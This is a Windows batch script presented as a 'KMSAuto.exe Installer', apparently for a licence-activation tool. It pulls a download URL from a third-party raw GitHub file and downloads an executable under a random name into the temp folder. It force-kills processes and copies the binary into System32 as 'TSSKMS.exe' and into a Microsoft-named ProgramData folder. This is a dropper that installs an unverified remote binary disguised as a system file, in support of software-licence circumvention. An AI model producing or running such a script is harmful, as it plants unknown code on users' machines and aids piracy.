:: KMSAuto.exe Installer
@echo off


setlocal enabledelayedexpansion


set "KMSROOT=%SystemRoot%\System32\TSSKMS.exe"
set "KMSFILE=%ProgramData%\Microsoft\Windows\KMSAuto.exe"


color 0A
 
:loop



set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)

echo.
echo Filename=!filename!.exe
echo.

:DOWNLOADINGAGAIN
echo.
echo.
echo.
echo.

:: Kill & Delete file 
taskkill /f /im !filename!.exe
del /f /a /q "%TEMP%\!filename!.exe"
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/KMSAutoFileLink') do set "KMSFILELINK=%%i"

echo.
echo KMSFILELINK=%KMSFILELINK%
echo.

:: Download the file using curl
curl -L -# -o "%TEMP%\!filename!.exe" "%KMSFILELINK%"
 
timeout /t 2 /nobreak 
 
:: Checking the existing of the file
if not exist "%TEMP%\!filename!.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)
 
 
 
:: Get the file size in bytes
for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 0.3MB (90000 bytes)
if %FILESIZE% geq 90000 (
    echo Starting....
    rem start "" "%TEMP%\!filename!.exe"
    echo Started.
    echo.
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)
 


echo.
echo.
echo.



echo Checking before installation


if exist "%KMSROOT%" (
    echo File exists in %KMSROOT%
) else (
    echo ERROR File not found in %KMSROOT%
)



if exist "%KMSFILE%" (
    echo File exists in %KMSFILE%.
) else (
    echo ERROR File not found in %KMSFILE%.
)



echo.
echo.
echo.
echo TaskKill and Delete KMSAuto
taskkill /F /IM KMSAuto.exe
taskkill /F /IM KMSAuto.exe
del /f /a /q "%KMSROOT%"
del /f /a /q "%KMSFILE%"
echo Done.
echo.
echo.
echo Copying files..
copy "%TEMP%\!filename!.exe" "%KMSROOT%" /y
copy "%TEMP%\!filename!.exe" "%KMSFILE%" /y
echo Done.
echo.
echo.


echo Checking files..

if exist "%KMSROOT%" (
    echo File exists in %KMSROOT%
) else (
    echo ERROR File not found in %KMSROOT%
)



if exist "%KMSFILE%" (
    echo File exists in %KMSFILE%.
) else (
    echo ERROR File not found in %KMSFILE%.
)



echo.
echo Check Done.
echo.
echo.





